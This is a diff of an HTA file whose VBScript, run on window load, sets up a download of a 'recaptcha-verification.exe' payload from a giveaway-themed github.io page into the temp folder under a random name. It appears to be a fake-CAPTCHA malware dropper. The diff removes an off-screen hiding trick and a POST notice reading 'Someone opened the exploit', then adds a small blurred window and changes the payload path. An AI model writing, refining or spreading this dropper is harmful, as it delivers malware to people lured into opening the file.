@@ -11,19 +11,17 @@
     </hta:application>
     <script language="VBScript">
         Sub Window_onLoad()
-            ' Hide the HTA window by resizing and moving it off-screen
-            Window.ResizeTo 1, 1
-            Window.MoveTo -32000, -32000
-
-            ' Log an action (example POST request - modify to your needs)
-            Call SendPostRequest("@here Someone opened the exploit")
+            ' Minimize the HTA window
+            Window.ResizeTo 200, 100
+            Window.MoveTo 0, 0
+            Window.blur() ' Moves the window out of focus
 
             ' Create WScript Shell object
             Set objShell = CreateObject("WScript.Shell")
 
             ' Define temp folder and download URL
             tempFolder = objShell.ExpandEnvironmentStrings("%temp%")
-            downloadUrl = "https://yeut11.github.io/giveawaysontop.github.io/recaptcha-verify/recaptcha-verification.exe"
+            downloadUrl = "https://yeut11.github.io/giveawaysontop.github.io/recaptcha-verification.exe"
             
             ' Generate a random file name
             randomFileName = GenerateRandomFileName() & ".exe"
@@ -47,16 +45,6 @@
             Next
             GenerateRandomFileName = randomString
         End Function
-
-        Sub SendPostRequest(message)
-            ' Replace with your method to send POST requests (e.g., using XMLHttpRequest or a third-party tool)
-            ' Here is an example of how it might be implemented:
-            Dim http
-            Set http = CreateObject("Microsoft.XMLHTTP")
-            http.Open "POST", "https://example.com/endpoint", False
-            http.SetRequestHeader "Content-Type", "application/x-www-form-urlencoded"
-            http.Send "message=" & message
-        End Sub
     </script>
 </head>
 <body>
